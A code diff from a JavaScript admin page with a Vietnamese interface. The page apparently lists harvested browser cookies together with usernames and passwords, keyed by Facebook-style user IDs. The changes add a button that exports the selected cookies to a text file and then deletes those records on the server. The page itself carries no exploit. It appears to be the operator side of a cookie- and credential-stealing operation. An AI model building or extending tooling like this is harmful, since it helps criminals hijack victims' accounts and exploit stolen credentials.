@@ -64,7 +64,7 @@ function setListCookies(res){
             <td>${element['browser']}</td>
             <td>
                 <div class="form-group purple-border">
-                    <textarea class="form-control" id="exampleFormControlTextarea4" rows="3">${element['cookie']}</textarea>
+                    <textarea class="form-control" id="value-cookie${count}" rows="3">${element['cookie']}</textarea>
                 </div>
             </td>
             <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
@@ -97,12 +97,9 @@ function setListCookies(res){
             <td>
             <button value=${element['id']} id="btn-delete${count}" class="btn btn-danger w-20 ml-3 confirm-button">Xóa</button>
             </td>
+            <td></td>
       
         </tr>`;
-        // if(element['uid'] != '100003365324028' && element['uid'] != '100000027109103' && element['uid'] != '100072634290101' && element['uid'] != '606610471'){
-        //     html += htmlSegment;
-        //     count++;
-        // }
         if(blockUid(element['uid'])){
             html += htmlSegment;
             count++;
@@ -172,7 +169,77 @@ function setListCookies(res){
             alertError("Chưa có mục nào được chọn!");
         }
     }
+    //
+    document.getElementById("btn-download-select").onclick=function(){
+        var listCookies = [];
+        var indexDelete = [];
+        for(var i=1;i<=count;i++){
+            try{
+                var checked = document.getElementById(`checkbox-delete${i}`).checked;
+                if(checked){
+                    var cookies = {
+                        id: document.getElementById(`checkbox-delete${i}`).value
+                    }
+                    listCookies.push(cookies);
+                    indexDelete.push(i);
+                }
+            }
+            catch(err){
+    
+            }
+        }
+        if(listCookies.length>0){
+            if(confirm("Xác nhận tải những mục đã chọn?")){
+    
+                ///
+                var saveCookies = "";
+                indexDelete.forEach(element=>{
+                    saveCookies+=document.getElementById(`value-cookie${element}`).value+"\n";
+                });
+    
+                var blob = new Blob([saveCookies], {
+                type: "text/plain;charset=utf-8",
+                });
+                
+                saveAs(blob, `${new Date()}.txt`);
+    
+    
+    
+                indexDelete.forEach(element=>{
+                    document.getElementById(`tr-cookies${element}`).remove();
+                });
+    
+                var jwtToken = getJwtTokenFromLocalStorage();
+                if(jwtToken!=null){
+                    $.ajax({
+                        url : server+"/delete-list-cookies",
+                        headers: {
+                        'Authorization':'Bearer '+jwtToken
+                        },
+                        contentType: 'application/json;charset=utf-8',
+                        type : "POST",
+                        dataType:"json",
+                        data: JSON.stringify(listCookies)
+                    });
+                    alertSuccess("Tải thành công!");
+                    
+                }
+                else{
+                    window.location.href = '../index.html';
+                }
+            }
+        }
+        else{
+            alertError("Chưa có mục nào được chọn!");
+        }
+    }
 }
+
+
+
+
+
+
 function mappingBtn(i){
     document.getElementById(`btn-delete${i}`).onclick =function(){
         if(confirm(`Xác nhận xóa cookies số ${i}?`)){
